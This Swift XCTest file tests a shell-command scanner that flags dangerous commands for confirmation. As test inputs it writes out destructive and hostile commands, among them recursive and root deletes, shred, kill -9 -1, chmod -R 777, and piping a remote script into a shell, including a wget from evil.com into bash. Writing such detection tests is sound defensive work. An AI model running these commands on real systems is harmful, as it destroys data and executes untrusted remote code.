import XCTest

@testable import DangerousCommandScanner

final class RuleEngineConfirmTests: XCTestCase {

    private let scanner = DangerousCommandScanner()

    // MARK: - C1: Recursive delete

    func testRmDashRfConfirms() {
        assertConfirm("rm -rf ~/tmp/build", rule: .recursiveDelete)
    }

    func testRmDashRSpaceDashFConfirms() {
        assertConfirm("rm -r -f ./dist", rule: .recursiveDelete)
    }

    func testRmDashFrConfirms() {
        assertConfirm("rm -fr /tmp/junk", rule: .recursiveDelete)
    }

    func testRmRecursiveLongFlagConfirms() {
        assertConfirm("rm --recursive --force /tmp/junk", rule: .recursiveDelete)
    }

    func testRmUppercaseRConfirms() {
        assertConfirm("rm -R -f /tmp/junk", rule: .recursiveDelete)
    }

    func testRmTargetingRootConfirms() {
        assertConfirm("rm /", rule: .recursiveDelete)
    }

    func testRmTargetingHomeConfirms() {
        assertConfirm("rm ~", rule: .recursiveDelete)
    }

    func testRmTargetingStarConfirms() {
        assertConfirm("rm *", rule: .recursiveDelete)
    }

    func testRmTargetingDotConfirms() {
        assertConfirm("rm .", rule: .recursiveDelete)
    }

    func testPlainRmSingleFileIsClean() {
        XCTAssertEqual(scanner.scan("rm build.log"), .clean)
    }

    // MARK: - C2: Secure erase

    func testSrmConfirms() {
        assertConfirm("srm secret.txt", rule: .secureErase)
    }

    func testShredConfirms() {
        assertConfirm("shred -u secrets.db", rule: .secureErase)
    }

    func testRmDashPConfirms() {
        assertConfirm("rm -P sensitive.key", rule: .secureErase)
    }

    // MARK: - C3: Piped remote execution

    func testCurlPipeShConfirms() {
        assertConfirm("curl https://example.com/install.sh | sh", rule: .pipedRemoteExecution)
    }

    func testWgetPipeBashConfirms() {
        assertConfirm("wget -O - https://evil.com/x | bash", rule: .pipedRemoteExecution)
    }

    func testCurlPipeZshConfirms() {
        assertConfirm("curl https://example.com/setup | zsh", rule: .pipedRemoteExecution)
    }

    // MARK: - C4: Broad permission change

    func testChmod777RecursiveConfirms() {
        assertConfirm("chmod -R 777 /var/www", rule: .broadPermissionChange)
    }

    func testChmodAPlRwxRecursiveConfirms() {
        assertConfirm("chmod -R a+rwx /var/www", rule: .broadPermissionChange)
    }

    func testChownRecursiveBroadPathConfirms() {
        assertConfirm("chown -R root:wheel /", rule: .broadPermissionChange)
    }

    func testChgrpRecursiveBroadPathConfirms() {
        assertConfirm("chgrp -R staff /usr", rule: .broadPermissionChange)
    }

    // MARK: - C5: dd file-to-file

    func testDdFileToFileConfirms() {
        assertConfirm("dd if=input.img of=output.img bs=4k", rule: .ddFileCopy)
    }

    func testDdWithoutOfIsClean() {
        XCTAssertEqual(scanner.scan("dd if=input.img bs=4k"), .clean)
    }

    // MARK: - C6: Broad kill

    func testKill9Neg1Confirms() {
        assertConfirm("kill -9 -1", rule: .broadKill)
    }

    func testKillKILLNeg1Confirms() {
        assertConfirm("kill -KILL -1", rule: .broadKill)
    }

    func testKillallDash9Confirms() {
        assertConfirm("killall -9 firefox", rule: .broadKill)
    }

    func testPkill9Confirms() {
        assertConfirm("pkill -9 java", rule: .broadKill)
    }

    // MARK: - C8: Shell profile edits

    func testCrontabDashRConfirms() {
        assertConfirm("crontab -r", rule: .shellProfileEdit)
    }

    func testCrontabDashStdinConfirms() {
        assertConfirm("crontab -", rule: .shellProfileEdit)
    }

    func testEditZshrcConfirms() {
        assertConfirm("nano ~/.zshrc", rule: .shellProfileEdit)
    }

    func testEditBashProfileConfirms() {
        assertConfirm("vim ~/.bash_profile", rule: .shellProfileEdit)
    }

    func testEditBashrcConfirms() {
        assertConfirm("code ~/.bashrc", rule: .shellProfileEdit)
    }

    func testTeeAppendToProfileConfirms() {
        assertConfirm("echo 'export FOO=bar' >> ~/.zshrc", rule: .shellProfileEdit)
    }

    // MARK: - C9: Git destructive

    func testGitCleanFdxConfirms() {
        assertConfirm("git clean -fdx", rule: .gitDestructive)
    }

    func testGitResetHardConfirms() {
        assertConfirm("git reset --hard", rule: .gitDestructive)
    }

    func testGitPushForceConfirms() {
        assertConfirm("git push --force", rule: .gitDestructive)
    }

    func testGitPushDashFConfirms() {
        assertConfirm("git push -f origin main", rule: .gitDestructive)
    }

    // MARK: - C10: Bulk move/delete

    func testFindDeleteConfirms() {
        assertConfirm("find /tmp -name '*.log' -delete", rule: .bulkMoveDelete)
    }

    func testFindExecRmConfirms() {
        assertConfirm("find . -name '*.bak' -exec rm {} ;", rule: .bulkMoveDelete)
    }

    // MARK: - C12: Unparseable propagation

    func testDeeplyNestedCommandConfirmsAsUnparseable() {
        var deep = "echo hi"
        for _ in 0..<10 {
            deep = "echo $(\(deep))"
        }
        let verdict = scanner.scan(deep)
        XCTAssertTrue(verdict.isBlocked, "Deeply nested command should be blocked")
    }

    // MARK: - Helpers

    private func assertConfirm(
        _ command: String,
        rule: RuleID,
        file: StaticString = #filePath,
        line: UInt = #line
    ) {
        let verdict = scanner.scan(command)
        guard case .confirm(let findings) = verdict else {
            XCTFail(
                "Expected .confirm for: \(command), got: \(verdict)",
                file: file, line: line)
            return
        }
        XCTAssertTrue(
            findings.contains(where: { $0.rule == rule }),
            "Expected rule \(rule) in findings for: \(command), got: \(findings.map(\.rule))",
            file: file,
            line: line)
    }
}
